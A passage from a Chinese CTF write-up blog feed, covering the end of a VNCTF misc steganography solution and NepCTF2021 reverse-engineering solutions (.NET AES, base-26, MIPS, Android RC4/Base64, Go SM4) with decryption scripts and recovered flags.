class="line">\u-65432?\u-65420?\u-65420?\u-65424?\u-65421?\u-65478?\u-65489?\u-65489?\u-65418?\u-65426?\u-65437?\u-65420?\u-65434?\u-65491?\u-65486?\u-65487?\u-65485?\u-65491?\u-65487?\u-65486?\u-65483?\u-65481?\u-65488?\u-65482?\u-65487?\u-65487?\u-65486?\u-65485?\u-65490?\u-65437?\u-65425?\u-65421?\u-65490?\u-65439?\u-65424?\u-65491?\u-65426?\u-65439?\u-65426?\u-65430?\u-65431?\u-65426?\u-65433?\u-65490?\u-65427?\u-65415?\u-65423?\u-65437?\u-65428?\u-65425?\u-65419?\u-65436?\u-65490?\u-65437?\u-65425?\u-65427?\u-65489?\u-65456?\u-65415?\u-65425?\u-65426?\u-65433?\u-65415?\u-65439?\u-65426?\u-65433?\u-65499?\u-65486?\u-65488?\u-65421?\u-65420?\u-65425?\u-65422?\u-65435?\u-65421?\u-65499?\u-65486?\u-65488?\u-65428?\u-65425?\u-65417?\u-65499?\u-65486?\u-65488?\u-65425?\u-65426?\u-65499?\u-65486?\u-65488?\u-65434?\u-65425?\u-65422?\u-65435?\u-65431?\u-65433?\u-65426?\u-65499?\u-65486?\u-65488?\u-65433?\u-65425?\u-65425?\u-65436?\u-65421?\u-65499?\u-65486?\u-65488?\u-65439?\u-65427?\u-65431?\u-65436?\u-65499?\u-65486?\u-65488?\u-65458?\u-65425?\u-65422?\u-65420?\u-65432?\u-65499?\u-65486?\u-65488?\u-65461?\u-65425?\u-65422?\u-65435?\u-65439?\u-65426?\u-65499?\u-65486?\u-65488?\u-65469?\u-65457?\u-65450?\u-65463?\u-65468?\u-65491?\u-65487?\u-65479?\u-65499?\u-65486?\u-65488?\u-65424?\u-65439?\u-65422?\u-65439?\u-65426?\u-65425?\u-65431?\u-65439?\u-65490?\u-65422?\u-65439?\u-65422?</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>有个问号？？迷了一阵子，相减？尝试想到常见的rsa的e，0x10001是65537，尝试发现不可读，最后发现u是0x10000</p><p>数据清洗一下，最后得出一个url</p><p><img src="https://13-1301107080.cos.ap-guangzhou.myqcloud.com/image-20210315085202514.png" alt="image-20210315085202514"></p><p>打开url下载附件。</p><p><img src="https://13-1301107080.cos.ap-guangzhou.myqcloud.com/image-20210315085254911.png" alt="image-20210315085254911"></p><p>四位数字爆破一下发现密码是9705</p><p>改zip打开</p><p><img src="https://13-1301107080.cos.ap-guangzhou.myqcloud.com/image-20210315085459400.png" alt="image-20210315085459400"></p><p>零宽字符隐写</p><p>解得：vnctf{APT_1S_c0M1nG</p><p>图片只有一开始邮件那个出现过，把他保存下来发现名字叫ThisIsSecret</p><p>想到oursecret加密</p><p>得到后半段_fr0m_l@z@RuS}</p><p>故</p><p>vnctf{APT_1S_c0M1nG_fr0m_l@z@RuS}</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;终于有输出了，逆向做了一天。两道安卓动调试了很久很久，一道解密不出，然后发现是解密网站有问题，用脚本就可以。。一道感觉数据有问题，逆向不回去。。一道逆向爆破不出来。。。麻了。。。。&lt;/p&gt;
&lt;h1 id=&quot;re&quot;&gt;&lt;a href=&quot;#re&quot; class=&quot;headerlin</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>NepCTF2021-wp</title>
    <link href="http://example.com/2021/03/22/NepCTF2021-wp/"/>
    <id>http://example.com/2021/03/22/NepCTF2021-wp/</id>
    <published>2021-03-22T05:31:59.000Z</published>
    <updated>2021-03-22T05:32:13.756Z</updated>
    
    <content type="html"><![CDATA[<h1 id="NepCTF"><a href="#NepCTF" class="headerlink" title="NepCTF"></a>NepCTF</h1><p>id:1secsawe</p><p>队名：fasfdsada</p><p>分数：971</p><p>排名：10</p><p>第一天：</p><p>5re，2cry，1misc</p><p>第二题：</p><p>4misc，2pwn</p><p>那晚12点打了一个ctftime上的一个比赛，打太晚，睡过头了，11点多才起来。按顺序做下去，发现很多没有血了。。。。逆向感觉，前面简单的很简单，难的太难了。。不会。。。麻了。我太菜了。学了一个多学期还是这水平，哭了</p><h2 id="re"><a href="#re" class="headerlink" title="re"></a>re</h2><h3 id="1-hardcsharp"><a href="#1-hardcsharp" class="headerlink" title="1.hardcsharp"></a>1.hardcsharp</h3><p>简单的.Net逆向，拖进dnSpy,反编译。</p><p>发现只是简单的AES加密，突然想到，好像可以改源码直接调用里面的库进行，解密，然后保存，就可以直接输出flag了。。</p><p><img src="https://13-1301107080.cos.ap-guangzhou.myqcloud.com/image-20210322004758156.png" alt="image-20210322004758156"></p><p>改后的exp，运行程序就出了。。自吐flag</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line">private static void Main(string[] args)</span><br><span class="line">&#123;</span><br><span class="line">AesClass aesClass = new AesClass();</span><br><span class="line">string text = <span class="string">&quot;&quot;</span>;</span><br><span class="line">string text2 = <span class="string">&quot;1Umgm5LG6lNPyRCd0LktJhJtyBN7ivpq+EKGmTAcXUM+0ikYZL4h4QTHGqH/3Wh0&quot;</span>;</span><br><span class="line">byte[] array = new byte[]</span><br><span class="line">&#123;</span><br><span class="line"><span class="number">81</span>,</span><br><span class="line"><span class="number">82</span>,</span><br><span class="line"><span class="number">87</span>,</span><br><span class="line"><span class="number">81</span>,</span><br><span class="line"><span class="number">82</span>,</span><br><span class="line"><span class="number">87</span>,</span><br><span class="line"><span class="number">68</span>,</span><br><span class="line"><span class="number">92</span>,</span><br><span class="line"><span class="number">94</span>,</span><br><span class="line"><span class="number">86</span>,</span><br><span class="line"><span class="number">93</span>,</span><br><span class="line"><span class="number">18</span>,</span><br><span class="line"><span class="number">18</span>,</span><br><span class="line"><span class="number">18</span>,</span><br><span class="line"><span class="number">18</span>,</span><br><span class="line"><span class="number">18</span>,</span><br><span class="line"><span class="number">18</span>,</span><br><span class="line"><span class="number">18</span>,</span><br><span class="line"><span class="number">18</span>,</span><br><span class="line"><span class="number">18</span>,</span><br><span class="line"><span class="number">18</span>,</span><br><span class="line"><span class="number">18</span>,</span><br><span class="line"><span class="number">18</span>,</span><br><span class="line"><span class="number">18</span>,</span><br><span class="line"><span class="number">18</span>,</span><br><span class="line"><span class="number">18</span>,</span><br><span class="line"><span class="number">18</span>,</span><br><span class="line"><span class="number">18</span>,</span><br><span class="line"><span class="number">18</span>,</span><br><span class="line"><span class="number">18</span>,</span><br><span class="line"><span class="number">18</span>,</span><br><span class="line"><span class="number">18</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">for</span> (<span class="built_in">int</span> i = <span class="number">0</span>; i &lt; <span class="number">32</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line">text += Convert.ToChar((<span class="built_in">int</span>)(array[i] ^ <span class="number">51</span>)).ToString();</span><br><span class="line">&#125;</span><br><span class="line">Console.WriteLine(aesClass.AesDecrypt(text2, text));</span><br><span class="line">Console.ReadKey();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://13-1301107080.cos.ap-guangzhou.myqcloud.com/image-20210322005246983.png" alt="image-20210322005246983"></p><p>flag:Nep{up_up_down_down_B_a_b_A_Nep_nep~}</p><h3 id="2-二十六进制"><a href="#2-二十六进制" class="headerlink" title="2.二十六进制"></a>2.二十六进制</h3><p><img src="https://13-1301107080.cos.ap-guangzhou.myqcloud.com/image-20210322005800241.png" alt="image-20210322005800241"></p><p>输入数字，转成十六进制。，传进sub_401120，</p><p><img src="https://13-1301107080.cos.ap-guangzhou.myqcloud.com/image-20210322005914223.png" alt="image-20210322005914223"></p><p>其实题目看不太懂，然后进sub_401190看了一眼。发现出现flag字眼，从下往上看，发现有比对，然后将比对字符串，与下图变量比对。<img src="https://13-1301107080.cos.ap-guangzhou.myqcloud.com/image-20210322010054125.png" alt="image-20210322010054125"></p><p>他的值在<img src="https://13-1301107080.cos.ap-guangzhou.myqcloud.com/image-20210322010117752.png" alt="image-20210322010117752"></p><p>发生了改变。也就是说，最后的比对字符串就是上面这个函数最后的输出。可以先求出v3原来的值</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">dd=<span class="string">&#x27;Fb72&gt;&amp;6&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(dd)):</span><br><span class="line">print(<span class="built_in">chr</span>(<span class="built_in">ord</span>(dd[i])^<span class="number">7</span>),end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"><span class="comment">#p=&#x27;Ae059!1&#x27;</span></span><br></pre></td></tr></table></figure><p>然后发现这个值是通过我们输入的数字，查表，然后除26，先算出余26的值，往复这个操作。然后我们找到这字符串每个字符在表中的位置</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">p=<span class="string">&#x27;Ae059!1&#x27;</span></span><br><span class="line">s=[<span class="number">0x32</span>, <span class="number">0x31</span>, <span class="number">0x36</span>, <span class="number">0x33</span>, <span class="number">0x71</span>, <span class="number">0x77</span>, <span class="number">0x65</span>, <span class="number">0x29</span>, <span class="number">0x28</span>, <span class="number">0x2A</span>,</span><br><span class="line">  <span class="number">0x26</span>, <span class="number">0x5E</span>, <span class="number">0x25</span>, <span class="number">0x34</span>, <span class="number">0x38</span>, <span class="number">0x39</span>, <span class="number">0x24</span>, <span class="number">0x21</span>, <span class="number">0x30</span>, <span class="number">0x35</span>,</span><br><span class="line">  <span class="number">0x37</span>, <span class="number">0x40</span>, <span class="number">0x23</span>, <span class="number">0x3E</span>, <span class="number">0x3C</span>, <span class="number">0x41</span>]</span><br><span class="line"></span><br><span class="line">print(<span class="built_in">len</span>(s))</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(p)):</span><br><span class="line">    <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(s)):</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">chr</span>(s[k])==p[i]:</span><br><span class="line">            print(k,end=<span class="string">&#x27; &#x27;</span>)</span><br><span class="line"><span class="comment">#25 6 18 19 15 17 1</span></span><br></pre></td></tr></table></figure><p>然后发现是从大数开始除的，我们就要从又往左边展开，一个逆过程。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">print(((((((<span class="number">1</span>*<span class="number">26</span>+<span class="number">17</span>)*<span class="number">26</span>+<span class="number">15</span>)*<span class="number">26</span>+<span class="number">19</span>)*<span class="number">26</span>+<span class="number">18</span>)*<span class="number">26</span>+<span class="number">6</span>)*<span class="number">26</span>+<span class="number">25</span>))</span><br><span class="line"><span class="comment">#518100101</span></span><br></pre></td></tr></table></figure><p>然后md5加密。</p><p>flag：Nep{967fa25cbea166ded43127f141cff31a}</p><h3 id="3-easymips"><a href="#3-easymips" class="headerlink" title="3.easymips"></a>3.easymips</h3><p>ida7.5万岁，万岁。</p><p>这好像拿了一个三血。。</p><p>拖进32位的ida7.5，打开main函数。。直接审计。</p><p><img src="https://13-1301107080.cos.ap-guangzhou.myqcloud.com/image-20210322011207508.png" alt="image-20210322011207508"></p><p>进tty_write函数</p><p><img src="https://13-1301107080.cos.ap-guangzhou.myqcloud.com/image-20210322011259039.png" alt="image-20210322011259039"></p><p>发现v6和一个字符串进行比对，相等着回显flag正确。往上看，发现v6传进<img src="https://13-1301107080.cos.ap-guangzhou.myqcloud.com/image-20210322011339601.png" alt="image-20210322011339601"></p><p>进行加密，也就是说，加密后的密文是下面比对的字符串，密文有了，拿着密文进函数，<img src="https://13-1301107080.cos.ap-guangzhou.myqcloud.com/image-20210322011434035.png" alt="image-20210322011434035"></p><p>v6=a1,传进来的时候又进入init（）函数初始化，发现进行了伪随机数的一系列操作，和我年初给萌新群出的新春赛的一道逆向思路一样。直接搞出rand（）的值，（不过要注意rand的平台，一开始在windos下编译，发现，，跑不出来值，然后转到linux下，发现跑出值了。<img src="https://13-1301107080.cos.ap-guangzhou.myqcloud.com/image-20210322013002047.png" alt="image-20210322013002047"></p><p><img src="https://13-1301107080.cos.ap-guangzhou.myqcloud.com/image-20210322011827519.png" alt="image-20210322011827519"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">v3=<span class="number">5</span></span><br><span class="line">p=<span class="string">&quot;3_isjA0UeQZcNa\\`\\Vf&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(p)):</span><br><span class="line">    print(<span class="built_in">chr</span>(<span class="built_in">ord</span>(p[i])+v3),end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    v3+=<span class="number">1</span></span><br><span class="line"><span class="comment">#8ep&#123;sK;ar_is_sotql&#125;</span></span><br></pre></td></tr></table></figure><p><img src="https://13-1301107080.cos.ap-guangzhou.myqcloud.com/image-20210322013144156.png" alt="image-20210322013144156"></p><p>然后<img src="https://13-1301107080.cos.ap-guangzhou.myqcloud.com/image-20210322013203923.png" alt="image-20210322013203923"></p><p>然后<img src="https://13-1301107080.cos.ap-guangzhou.myqcloud.com/image-20210322014120572.png" alt="image-20210322014120572"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">a1^&#x3D;68+50</span><br><span class="line">a1[5]^&#x3D;93-57</span><br><span class="line">hex(658791793)&#x3D;0x27445d71</span><br><span class="line">#取最高位</span><br><span class="line">a1[6]^&#x3D;0x27+48</span><br></pre></td></tr></table></figure><p>然后分别异或回去</p><p>可得到最终flag：Nep{solar_is_sotql}</p><h3 id="4-password"><a href="#4-password" class="headerlink" title="4.password"></a>4.password</h3><p>安卓逆向题，rc4+变表Base64</p><p><img src="https://13-1301107080.cos.ap-guangzhou.myqcloud.com/image-20210322014429098.png" alt="image-20210322014429098"></p><p>未加壳。</p><p>直接丢尽jadx看看反汇编</p><p><img src="https://13-1301107080.cos.ap-guangzhou.myqcloud.com/image-20210322014613281.png" alt="image-20210322014613281"></p><p>看代码看到可能有两个输入框输入，然后发现函数在native层，那就得用ida分析so文件了。然后直接压缩包打开，apk脱出.so文件。我脱出得是v7,得用32位ida打开，然后找到verify函数</p><p><img src="https://13-1301107080.cos.ap-guangzhou.myqcloud.com/image-20210322014856087.png" alt="image-20210322014856087"></p><p>发现base64格式得，直接拿去解密发现解密不出，想到换表，发现上面有base64的表。</p><p><img src="https://13-1301107080.cos.ap-guangzhou.myqcloud.com/image-20210322014957912.png" alt="image-20210322014957912"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line">str1 = <span class="string">&quot;3g6L2PWL2PXFmR+7ise7iq==&quot;</span></span><br><span class="line">string1 = <span class="string">&quot;abcdefghijklmnopqrstuvwxyz0123456789+/ABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;</span></span><br><span class="line">string2 = <span class="string">&quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&quot;</span></span><br><span class="line"><span class="built_in">print</span> (base64.b64decode(str1.translate(<span class="built_in">str</span>.maketrans(string1,string2))))</span><br><span class="line"><span class="comment">#th1s_1s_k3y!!!!!</span></span><br></pre></td></tr></table></figure><p>得到key，下面就是得到另一个打开压缩文件的key了。</p><p>进加密函数，发现是一个RC4，而且key刚才有了，密文在里面也有。</p><p><img src="https://13-1301107080.cos.ap-guangzhou.myqcloud.com/image-20210322015159705.png" alt="image-20210322015159705"></p><p><img src="https://13-1301107080.cos.ap-guangzhou.myqcloud.com/image-20210322015319295.png" alt="image-20210322015319295"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> re.re;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.Arrays;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">re</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">en1</span><span class="params">(<span class="keyword">int</span>[] iArr, String str, <span class="keyword">int</span> i)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">byte</span>[] bArr = <span class="keyword">new</span> <span class="keyword">byte</span>[<span class="number">256</span>];</span><br><span class="line">        <span class="keyword">byte</span>[] bytes = str.getBytes();</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i2 = <span class="number">0</span>; i2 &lt; <span class="number">256</span>; i2++) &#123;</span><br><span class="line">            iArr[i2] = <span class="number">256</span> - i2;</span><br><span class="line">            bArr[i2] = bytes[i2 % i];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">int</span> i3 = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i4 = <span class="number">0</span>; i4 &lt; <span class="number">256</span>; i4++) &#123;</span><br><span class="line">            i3 = ((iArr[i4] + i3) + bArr[i4]) % <span class="number">256</span>;</span><br><span class="line">            <span class="keyword">int</span> i5 = iArr[i4];</span><br><span class="line">            iArr[i4] = iArr[i3];</span><br><span class="line">            iArr[i3] = i5;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">en2</span><span class="params">(<span class="keyword">int</span>[] iArr, <span class="keyword">int</span>[] bArr, <span class="keyword">int</span> i)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> i2 = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">int</span> i3 = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i4 = <span class="number">0</span>; i4 &lt; i; i4++) &#123;</span><br><span class="line">            i2 = (i2 + <span class="number">1</span>) % <span class="number">256</span>;</span><br><span class="line">            i3 = ((iArr[i2] &amp; <span class="number">255</span>) + i3) % <span class="number">256</span>;</span><br><span class="line">            <span class="keyword">int</span> i5 = iArr[i2];</span><br><span class="line">            iArr[i2] = iArr[i3];</span><br><span class="line">            iArr[i3] = i5;</span><br><span class="line">            bArr[i4] =  (bArr[i4] ^ iArr[((iArr[i2] &amp; <span class="number">255</span>) + (iArr[i3] &amp; <span class="number">255</span>)) % <span class="number">256</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">int</span>[] file(<span class="keyword">int</span>[] bArr, String str) &#123;</span><br><span class="line">        <span class="keyword">int</span>[] iArr = <span class="keyword">new</span> <span class="keyword">int</span>[<span class="number">256</span>];</span><br><span class="line">        <span class="keyword">int</span>[] iArr2 = &#123;<span class="number">139</span>, <span class="number">210</span>, <span class="number">217</span>, <span class="number">93</span>, <span class="number">149</span>, <span class="number">255</span>, <span class="number">126</span>, <span class="number">95</span>, <span class="number">41</span>, <span class="number">86</span>, <span class="number">18</span>, <span class="number">185</span>, <span class="number">239</span>, <span class="number">236</span>, <span class="number">139</span>, <span class="number">208</span>, <span class="number">69</span>&#125;;</span><br><span class="line">        en1(iArr, str, str.length());</span><br><span class="line">        en2(iArr, bArr, bArr.length);</span><br><span class="line">        <span class="keyword">return</span> bArr;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span>[] iArr2 = &#123;<span class="number">139</span>, <span class="number">210</span>, <span class="number">217</span>, <span class="number">93</span>, <span class="number">149</span>, <span class="number">255</span>, <span class="number">126</span>, <span class="number">95</span>, <span class="number">41</span>, <span class="number">86</span>, <span class="number">18</span>, <span class="number">185</span>, <span class="number">239</span>, <span class="number">236</span>, <span class="number">139</span>, <span class="number">208</span>, <span class="number">69</span>&#125;;</span><br><span class="line">        System.out.println(Arrays.toString(file(iArr2, <span class="string">&quot;th1s_1s_k3y!!!!!&quot;</span>)));</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//[89, 48, 117, 71, 51, 116, 84, 104, 101, 80, 52, 115, 115, 119, 48, 114, 100]</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ss=[<span class="number">89</span>, <span class="number">48</span>, <span class="number">117</span>, <span class="number">71</span>, <span class="number">51</span>, <span class="number">116</span>, <span class="number">84</span>, <span class="number">104</span>, <span class="number">101</span>, <span class="number">80</span>, <span class="number">52</span>, <span class="number">115</span>, <span class="number">115</span>, <span class="number">119</span>, <span class="number">48</span>, <span class="number">114</span>, <span class="number">100</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(ss)):</span><br><span class="line">print(<span class="built_in">chr</span>(ss[i]),end=<span class="string">&#x27;&#x27;</span>)</span><br></pre></td></tr></table></figure><p>解得</p><p>key：Y0uG3tTheP4ssw0rd</p><p>拿去解压缩包</p><p><img src="https://13-1301107080.cos.ap-guangzhou.myqcloud.com/image-20210322015526513.png" alt="image-20210322015526513"></p><p>flag：Nep{4c89261f-4d09-4bbf-be6c-9303128a143c}</p><p>做完。。想到了。。上周做的vn，好像是类似的题，，不知道加密是rc4，头铁，硬把rc4给逆了，最后看wp才知道是rc4，我太菜了。。。。。而且不知道key已经变了。。。搞了半天。。</p><h3 id="5-worrrrms"><a href="#5-worrrrms" class="headerlink" title="5.worrrrms"></a>5.worrrrms</h3><p>go逆向，没有去符号表，（大好人）</p><p>直接逆，定位到关键函数</p><p><img src="https://13-1301107080.cos.ap-guangzhou.myqcloud.com/image-20210322015942829.png" alt="image-20210322015942829"></p><p>进去，<img src="https://13-1301107080.cos.ap-guangzhou.myqcloud.com/image-20210322020030099.png" alt="image-20210322020030099"></p><p>讲真，看到sm4的时候有点劝退，因为没做过要sm4的逆向题，不过发现上面有一个<img src="https://13-1301107080.cos.ap-guangzhou.myqcloud.com/image-20210322020212421.png" alt="image-20210322020212421"></p><p>函数。进去。发现是base64没换表的加密<img src="https://13-1301107080.cos.ap-guangzhou.myqcloud.com/image-20210322020251793.png" alt="image-20210322020251793"></p><p>解密得到：icantelluasimple</p><p>然后百度了一波sm4，发现他是128位的ECB，发现上面刚解编码出来的刚好是16个数，</p><p>16*8=128</p><p>难道是key？然后去网上找了一个python脚本出来。然后想到上面还有一开始给的莫名其妙的十六进制，<img src="https://13-1301107080.cos.ap-guangzhou.myqcloud.com/image-20210322020452970.png" alt="image-20210322020452970"></p><p>拼起来，发现解密不出，然后想到小端存储，倒过来，成功解密。。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes</span><br><span class="line"></span><br><span class="line">SBOX = [<span class="string">&#x27;d6&#x27;</span>, <span class="string">&#x27;90&#x27;</span>, <span class="string">&#x27;e9&#x27;</span>, <span class="string">&#x27;fe&#x27;</span>, <span class="string">&#x27;cc&#x27;</span>, <span class="string">&#x27;e1&#x27;</span>, <span class="string">&#x27;3d&#x27;</span>, <span class="string">&#x27;b7&#x27;</span>, <span class="string">&#x27;16&#x27;</span>, <span class="string">&#x27;b6&#x27;</span>, <span class="string">&#x27;14&#x27;</span>, <span class="string">&#x27;c2&#x27;</span>, <span class="string">&#x27;28&#x27;</span>, <span 